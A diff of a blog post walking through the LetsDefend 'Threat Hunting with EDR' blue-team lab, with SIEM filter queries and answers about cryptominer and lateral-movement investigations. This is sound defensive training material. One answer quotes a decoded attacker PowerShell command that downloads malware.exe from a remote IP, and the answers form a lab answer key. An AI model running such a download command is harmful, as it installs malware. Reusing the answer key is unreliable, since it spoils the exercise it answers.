@@ -1,15 +1,14 @@
 ---
-series: ["Threat Hunting"]
-title: "Threat Hunting with EDR Walkthrough — LetsDefend"
-date: 2025-10-29
+date: '2025-10-29'
 draft: false
+title: Threat Hunting with EDR Walkthrough — LetsDefend
 ---
 
 ---
 
 ### Threat Hunting with EDR Walkthrough — LetsDefend
 
-![](/images/0_TWCVA6eqWDZwyV86.png)
+![](https://cdn-images-1.medium.com/max/800/0*TWCVA6eqWDZwyV86.png)
 
 [LetsDefend — Blue Team Training Platform](https://letsdefend.io/)
 
@@ -24,7 +23,7 @@ This course focuses on “Threat Hunting with EDR” and explores two key areas:
 
 Understanding the use of EDR tools in the threat hunting process, and the role of the data provided by these tools in threat detection and analysis, will allow us to develop the capabilities to respond more effectively and quickly to security events.
 
-![](/images/0_2g2VuJTQc2sxctnl.png)
+![](https://cdn-images-1.medium.com/max/800/0*2g2VuJTQc2sxctnl.png)
 
 EDR tools can assist threat hunters in several ways. First, EDR tools provide rich and detailed data about your endpoints. You can use this data to create hypotheses, queries, and indicators of compromise (IOCs) for threat hunting. In addition, these tools allow you to instantly detect and analyze endpoint incidents, enabling you to respond quickly and effectively in the early stages of a cyber threat.
 
@@ -83,7 +82,7 @@ In the world of cybersecurity, accurate and comprehensive data is essential to d
 
 In the threat hunting process, the search for indicators of compromise (IOC) and indicators of attack (IOA) are important techniques used by cybersecurity professionals to identify potential threats and malicious activity. The effective use of IOCs and IOAs is critical to the early detection and prevention of cyber threats.
 
-![](/images/0_-kQ4N2K7do1yVkjE.png)
+![](https://cdn-images-1.medium.com/max/800/0*-kQ4N2K7do1yVkjE.png)
 
 ( **Image Source** : <https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/> )
 
@@ -198,7 +197,7 @@ No Answer Needed
 
 A threat actor may be in the process of lateral movement across the internal network in order to have access to other parts of the network.
 
-![](/images/0_LTJQJg6-Nsk5rKMV.png)
+![](https://cdn-images-1.medium.com/max/800/0*LTJQJg6-Nsk5rKMV.png)
 
 ( **Image Source** : <https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/> )
 
@@ -220,7 +219,7 @@ A threat actor may be in the process of lateral movement across the internal net
 * **IDS/IPS Alerts:** Review alerts for potential attack activities within the internal network.
 * **Anomaly Detection:** Examine IDS/IPS alerts that identify deviations from normal behavior patterns.
 
-![](/images/0_vfo-eoQV2WUiKOv-.png)
+![](https://cdn-images-1.medium.com/max/800/0*vfo-eoQV2WUiKOv-.png)
 
 ( **Image Source** : <https://www.microsoft.com/en-us/security/blog/2020/06/10/the-science-behind-microsoft-threat-protection-attack-modeling-for-finding-and-stopping-evasive-ransomware/> )
 
@@ -261,7 +260,7 @@ No Answer Needed
 
 Filter for “rule.groups: zabbix” filter in the SIEM and search for “\*cpu\*”.
 
-![](/images/1_3XXZOx1SwAw6SqmFxfRuSA.png)
+![](https://cdn-images-1.medium.com/max/800/1*3XXZOx1SwAw6SqmFxfRuSA.png)
 
 **Answer:** app-server-01
 
@@ -269,7 +268,7 @@ Filter for “rule.groups: zabbix” filter in the SIEM and search for “\*cpu\
 
 Use the SIEM filters “rule.groups: windows\_application” and “data.win.system.eventID: 1033”.
 
-![](/images/1_UilugAhpPsrqAuSxol_uLw.png)
+![](https://cdn-images-1.medium.com/max/800/1*UilugAhpPsrqAuSxol_uLw.png)
 
 **Answer:** Cudo Miner: Bitcoin & Crypto Mining Software (Miner.exe)
 
@@ -277,7 +276,7 @@ Use the SIEM filters “rule.groups: windows\_application” and “data.win.sys
 
 Filter for “rule.groups: sysmon\_event1” and search for “\*miner.exe\*” in the SIEM.
 
-![](/images/1_5Ar2-l-iarkVmS0CMmArJA.png)
+![](https://cdn-images-1.medium.com/max/800/1*5Ar2-l-iarkVmS0CMmArJA.png)
 
 **Answer:** C:\\Users\\Admin\\Downloads\\miner.exe
 
@@ -285,7 +284,7 @@ Filter for “rule.groups: sysmon\_event1” and search for “\*miner.exe\*” 
 
 Filter for “rule.groups: sysmon\_event1” and search for “\*miner.exe\*” in the SIEM.
 
-![](/images/1_YkPvi0Kk6UfV6yz9xrpMqQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*YkPvi0Kk6UfV6yz9xrpMqQ.png)
 
 **Answer:** C:\\Windows\\bitsadmin.exe
 
@@ -293,7 +292,7 @@ Filter for “rule.groups: sysmon\_event1” and search for “\*miner.exe\*” 
 
 Search for “data.win.eventdata.image: [Executable\_Full\_Path]” in the SIEM.
 
-![](/images/1_h5b-t0TXCZ4xbTL3im9VXQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*h5b-t0TXCZ4xbTL3im9VXQ.png)
 
 **Answer:** account.cryptominer.io
 
@@ -301,7 +300,7 @@ Search for “data.win.eventdata.image: [Executable\_Full\_Path]” in the SIEM.
 
 Look for the domain in the LetsDefend “Threat Intel” module.
 
-![](/images/1_aDrZ5FZoEOW6IPXYknQXPQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*aDrZ5FZoEOW6IPXYknQXPQ.png)
 
 **Answer:** RiverChildren
 
@@ -309,7 +308,7 @@ Look for the domain in the LetsDefend “Threat Intel” module.
 
 Look up the group name in the “Threat Intel” module on Letsdefend.
 
-![](/images/1_q-oXm5FdiSKDhUNDr_gFyg.png)
+![](https://cdn-images-1.medium.com/max/800/1*q-oXm5FdiSKDhUNDr_gFyg.png)
 
 **Answer:** 514CF877644F22924DA63989F3B56CD9
 
@@ -317,7 +316,7 @@ Look up the group name in the “Threat Intel” module on Letsdefend.
 
 Query the hash obtained from the threat intelligence source in the SIEM search section. (“\*hash\*”)
 
-![](/images/1_jVlUgh8rUf6i-1ZJuk_Vlg.png)
+![](https://cdn-images-1.medium.com/max/800/1*jVlUgh8rUf6i-1ZJuk_Vlg.png)
 
 **Answer:** app-server-02
 
@@ -329,7 +328,7 @@ Query the hash obtained from the threat intelligence source in the SIEM search s
 
 > What is the full path of the process (parent process — path/binary\_name) that executed the miner application on the system where cryptomining malware was detected (other than the system that generated the high CPU usage alert)?
 
-![](/images/1_Aq1Q7mXyXVYkh0A8y9ECfQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*Aq1Q7mXyXVYkh0A8y9ECfQ.png)
 
 **Answer:** C:\\Windows\\w3wp.EXE
 
@@ -356,7 +355,7 @@ Query the hash obtained from the threat intelligence source in the SIEM search s
 
 Filter for “rule.groups: sysmon\_event1” and query “\*powershell.exe\*”.
 
-![](/images/1_nmD3JCqmGqemuY_j1wo4cQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*nmD3JCqmGqemuY_j1wo4cQ.png)
 
 **Answer:** 192.168.100.25
 
@@ -366,7 +365,7 @@ Filter for “rule.groups: sysmon\_event1” and query “\*powershell.exe\*”.
 
 Filter for “rule.groups: sysmon\_event1” in the SIEM and query “powershell.exe”. Decode the base64 encoded data in the results.
 
-![](/images/1_AHgZqcqDiE07Sc_DLhimkg.png)
+![](https://cdn-images-1.medium.com/max/800/1*AHgZqcqDiE07Sc_DLhimkg.png)
 
 **Answer:** Invoke-WebRequest -Uri “<http://12.68.1.100/malware.exe>” -OutFile “C:\Windows\Temp\malware.exe”
 
@@ -374,7 +373,7 @@ Filter for “rule.groups: sysmon\_event1” in the SIEM and query “powershell
 
 Look for the detected IP address in the LetsDefend “Threat Intel” module.
 
-![](/images/1_2kJbxr78bwxDFmuwtDBgGQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*2kJbxr78bwxDFmuwtDBgGQ.png)
 
 **Answer:** APT-SKR-41
 
@@ -382,7 +381,7 @@ Look for the detected IP address in the LetsDefend “Threat Intel” module.
 
 Look for the threat actor group name in the LetsDefend “Threat Intel” module and find the hash.
 
-![](/images/1_W_vLzYYCtZuTThYeLKXoUA.png)
+![](https://cdn-images-1.medium.com/max/800/1*W_vLzYYCtZuTThYeLKXoUA.png)
 
 **Answer:** 1230FB982C1A8DCBDF232BE450E124A34439D67
 
@@ -390,7 +389,7 @@ Look for the threat actor group name in the LetsDefend “Threat Intel” module
 
 Filter for the “rule.groups: sysmon\_event1” in the SIEM and query the detected hash in the search section. (“\*hash\*”)
 
-![](/images/1_LGi-PgTQKA6Yr2YqTD_kLw.png)
+![](https://cdn-images-1.medium.com/max/800/1*LGi-PgTQKA6Yr2YqTD_kLw.png)
 
 **Answer:** C:\\Windows\\explorer.exe
 
@@ -398,7 +397,7 @@ Filter for the “rule.groups: sysmon\_event1” in the SIEM and query the detec
 
 Filter for “rule.groups: sysmon\_event3” in SIEM and query the executable name in the search section. (“\*malware.exe\*”)
 
-![](/images/1_07pki_rB5OhXgBI7lgHZrg.png)
+![](https://cdn-images-1.medium.com/max/800/1*07pki_rB5OhXgBI7lgHZrg.png)
 
 **Answer:** 185.220.101.24
 
@@ -406,7 +405,7 @@ Filter for “rule.groups: sysmon\_event3” in SIEM and query the executable na
 
 Filter for “rule.groups: firewall” and “data.dstip: ‘[IP Address]’” in the SIEM.
 
-![](/images/1_kPQtjjXCclZO5q0skqNp4g.png)
+![](https://cdn-images-1.medium.com/max/800/1*kPQtjjXCclZO5q0skqNp4g.png)
 
 **Answer:** deny
 
@@ -431,7 +430,7 @@ Filter for “rule.groups: firewall” and “data.dstip: ‘[IP Address]’” 
 
 Filter for “rule.groups: windows” and “rule.mitre.id: T1087.001” in the SIEM.
 
-![](/images/1_6km9iPo9NMNPawSuicbDqw.png)
+![](https://cdn-images-1.medium.com/max/800/1*6km9iPo9NMNPawSuicbDqw.png)
 
 **Answer:** 172.16.8.159
 
@@ -445,7 +444,7 @@ Filter for “rule.groups: windows” and “rule.mitre.id: T1087.001” in the 
 
 Filter for “rule.groups: windows” and “rule.mitre.id: T1087.002” in the SIEM.
 
-![](/images/1_03A8IZBh_ySfZJe65LODXQ.png)
+![](https://cdn-images-1.medium.com/max/800/1*03A8IZBh_ySfZJe65LODXQ.png)
 
 **Answer:** Domain Admins
 
@@ -453,7 +452,7 @@ Filter for “rule.groups: windows” and “rule.mitre.id: T1087.002” in the 
 
 Filter for “rule.groups: windows” and “rule.mitre.id: T1018” in the SIEM.
 
-![](/images/1_wzuDrn9Ah-xvXS9T686T6Q.png)
+![](https://cdn-images-1.medium.com/max/800/1*wzuDrn9Ah-xvXS9T686T6Q.png)
 
 **Answer:** lab19.local
 
@@ -473,7 +472,7 @@ Filter for “rule.groups: windows” and “rule.mitre.technique: Remote System
 
 Filter for “rule.groups: windows” and “rule.mitre.technique: Remote System Discovery” in the SIEM.
 
-![](/images/1_dRKjRtXJ3hMzieRWxvEIKg.png)
+![](https://cdn-images-1.medium.com/max/800/1*dRKjRtXJ3hMzieRWxvEIKg.png)
 
 **Answer:** ifconfig.me
 
@@ -481,7 +480,7 @@ Filter for “rule.groups: windows” and “rule.mitre.technique: Remote System
 
 Filter for “rule.groups: windows” and “rule.mitre.id: T1070.001” in the SIEM.
 
-![](/images/1_rMmzpEBfRODLUdbo9X-CWw.png)
+![](https://cdn-images-1.medium.com/max/800/1*rMmzpEBfRODLUdbo9X-CWw.png)
 
 **Answer:** Microsoft-Windows-Sysmon/Operational
 
